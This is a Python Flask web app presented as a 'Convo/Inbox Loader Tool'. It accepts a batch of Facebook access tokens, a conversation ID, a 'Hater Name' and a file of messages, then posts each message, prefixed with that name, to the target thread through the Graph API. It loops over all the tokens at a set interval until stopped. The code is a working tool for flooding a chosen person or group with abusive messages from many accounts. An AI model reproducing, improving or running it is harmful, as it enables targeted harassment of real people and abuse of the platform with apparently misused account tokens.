from flask import Flask, request, redirect, url_for
import requests
import time
from datetime import datetime
import threading

app = Flask(__name__)
app.debug = True

# Global flag to control the loop
running = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Define function to handle message sending
def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    global running
    while running:
        try:
            for message1 in messages:
                message = str(mn) + ' ' + message1
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
        except Exception as e:
            print(f"Error while sending message: {message}")
            print(e)
            time.sleep(30)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global running
    if request.method == 'POST':
        # Get access tokens from the uploaded file or text input
        if 'tokenFile' in request.files:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().splitlines()
        else:
            access_tokens = request.form.get('accessTokens').splitlines()
        
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Start message sending in a separate thread
        if running:
            threading.Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages), daemon=True).start()

    elif request.method == 'GET':
        # Stop the message sending process when "Stop" button is clicked
        running = False
        print("Message sending stopped.")

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Aarav Shrivastava</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/" rel="stylesheet">
      <style>
        body{
          background-color: #f8f9fa;
        }
        .container{
          max-width: 500px;
          background-color: #fff;
          border-radius: 10px;
          padding: 20px;
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
          margin: 0 auto;
          margin-top: 20px;
        }
        .header{
          text-align: center;
          padding-bottom: 20px;
        }
        .btn-submit{
          width: 100%;
          margin-top: 10px;
        }
        .footer{
          text-align: center;
          margin-top: 20px;
          color: #888;
        }
      </style>
    </head>
    <body>
      <header class="header mt-4">
        <h1 class="mb-3"> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁
                                         BY
        AARAV SHRIVASTAVA   </h1>
      </header>

      <div class="container">
        <form action="/" method="post" enctype="multipart/form-data">
          <!-- Access Tokens (from file or manual input) -->
          <div class="mb-3">
            <label for="tokenFile">Upload Token File:</label>
            <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
          </div>
          <div class="mb-3">
            <label for="accessTokens">OR Enter Your Tokens (one per line):</label>
            <textarea class="form-control" id="accessTokens" name="accessTokens" rows="4"></textarea>
          </div>
          
          <div class="mb-3">
            <label for="threadId">Enter Convo/Inbox ID:</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          <div class="mb-3">
            <label for="kidx">Enter Hater Name:</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          <div class="mb-3">
            <label for="txtFile">Select Your Notepad File:</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          </div>
          <div class="mb-3">
            <label for="time">Speed in Seconds:</label>
            <input type="number" class="form-control" id="time" name="time" required>
          </div>
          <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
        </form>
        
        <!-- Stop button -->
        <form action="/" method="get" style="margin-top: 10px;">
            <button type="submit" class="btn btn-danger">Stop</button>
        </form>
      </div>
      
      <footer class="footer">
        <p>&copy; Developed by Aarav Shrivastava 2025. All Rights Reserved.</p>
        <p>Convo/Inbox Loader Tool</p>
        <p>Keep enjoying  <a href="</a></p>
      </footer>
    </body>
    </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
